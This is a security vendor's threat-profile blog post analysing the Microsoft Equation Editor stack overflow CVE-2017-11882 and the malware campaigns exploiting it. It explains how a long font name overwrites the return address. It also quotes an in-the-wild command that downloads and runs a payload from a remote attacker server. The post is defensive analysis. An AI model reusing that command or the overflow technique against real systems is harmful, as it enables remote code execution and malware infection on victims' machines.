@@ -1,0 +1,50 @@
+
+Threat Profile: Microsoft Equation Editor Backdoor
+
+Posted by
+Roy Moshailov on January 29, 2018 at 1:19 PM
+                           
+
+Find me on:
+
+Twitter 
+
+
+
+
+
+Towards the end of 2017, a group of researchers at Embedi discovered a Microsoft Office vulnerability that’s been quietly putting systems in danger for about 17 years.
+The vulnerability lies in the Office Equation Editor process (EQNEDT32.EXE), a legacy formula editor that allows users to construct math and science equations. The editor is included in the Microsoft Office package and several other commercial applications. Although the application can be used on its to formulate mathematical equations, it’s mostly used in conjunction with Microsoft Word as an OLE embedded object. Microsoft issued a binary patch for the vulnerability but many systems remain unpatched. Morphisec has identified multiple campaigns that use this vulnerability as an attack vector to download and execute various malicious payloads. Moreover, additional significant vulnerabilities have been discovered in the equation process.
+Microsoft Office Equation Editor:
+
+CVE–2017–11882 is a rare stack overflow vulnerability that allows full remote code execution in several trivial steps due to the missing ASLR/ DEP/ stack canaries protection. Microsoft issued a manual binary patch for the vulnerability, including enabling ASLR on EQNEDT32.EXE, however Equation Editor can only be fully patched by recompiling the code. The reasons for a manual patch rather than code recompilation were never stated, but rumors have it that the original code blueprints were lost.
+The equation process loophole is clearly one where other vulnerabilities could branch out from, as was indeed proven by researchers at Checkpoint. They recently published a proof-of-concept exploit for a new Equation Editor vulnerability, CVE-2018-0802. Their  exploit easily bypassed the added ASLR mitigation Following the CVE-2018-0802 announcement, Microsoft pushed a patch that removes the equation editor dependent files from the Office package, thereby disabling its functionality. Users who implemented this month's Patch Tuesday updates will find themselves unable to edit any equations created with the old Equation Editor. 
+All Windows versions with any Microsoft Office, including Microsoft 365, installed before the end of November 2017. 
+As soon as a victim opens the malicious document file (RTF), it releases an arbitrary code that launches the executable file from a remote server controlled by the attacker.
+It bypasses Windows and Office security mechanisms (even Windows 10) as the product was compiled without Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR).
+ProcessMitigations tool check:
+
+Equation Editor uses a binary equation format called the MTEF. MTEF header and multiple records are called MTEF data. The header contains the general information about the MTEF data. By analyzing the file contents, we can observe that the object class is Equation Editor 3, meaning it is an OLE equation object.
+
+The vulnerability is triggered when EQNEDT32.EXE attempts to copy the font name into a buffer that is created as local variable in unexported function. Note that the buffer is only 40 (0x28) bytes, which means that if the font name is longer than 40 bytes, the buffer will overflow. This leads to base pointer (EBP) and return address being overwritten, so after the function is done, the control flow will be taken to the assigned address set by the attacker. 
+Stack structure
+
+In the above example, the function will return back to 0046681c, the address of WinExec (from kernenl32.dll), where the argument is the “font name”, which is "cmd /c \\[185].[198].[59].[121]\jce.src] & UUUUUUUUU" in our example, which will download a payload from the web and run it on the victim’s machine.
+Since the exploit was published, we have identified multiple campaigns that use this vulnerability as an attack vector to infiltrate malicious artifacts onto the system. Morphisec observed a number of different techniques used in the wild to execute malicious code from a remote attacker server:
+The last campaigns identified retrieved a variety of malicious payloads from an SMB server, for example: RokRAT, LokiBot and FormBook.
+FormBook is an information and password stealer that we’ve been seeing more and more of recently; it is also keylogger and can take screenshots. The malware code is fairly obfuscated (no common strings and API calls). LokiBot and FormBook use RunPE/ProcessHollowing techniques to evade detection and to thwart the mitigation capabilities of security products.
+On the 24th of January, Malware Traffic Analysis also noticed the adoption of this exploit by Hancitor campaigns – this certainly indicates the wide-spread adoption of the exploit among cybercrime groups.
+An RTF file exploiting this vulnerability had a 43/59 detection ratio on VirusTotal on 1/11/ 2018 — not too bad:
+
+However, a slight change in the executed technique immediately reduces the static detection score — An RTF file exploiting this vulnerability on 1/16/2018 gets only 13/59 in VirusTotal:
+
+How Does Morphisec Protect You from the Equation Editor Backdoor?
+Morphisec’s Moving Target Defense stops the attack across its attack chain, at both the document exploitation phase and the payload malware itself. Morphisec doesn’t rely on signature or behavioral patterns but rather process morphing to prevent exploitation and the malware (together and separately). The attack is stopped before it can perform any type of malicious activity.
+Resources
+https://0patch.blogspot.co.il/2017/11/did-microsoft-just-manually-patch-their.html
+https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html
+https://research.checkpoint.com/another-office-equation-rce-vulnerability/
+https://researchcenter.paloaltonetworks.com/2017/12/unit42-analysis-of-cve-2017-11882-exploit-in-the-wild/
+RTF files:
+Payloads:
+ hbspt.cta.load(1534169, 'da24a843-4814-4b08-86ff-46fe8c5eaf96', {}); 
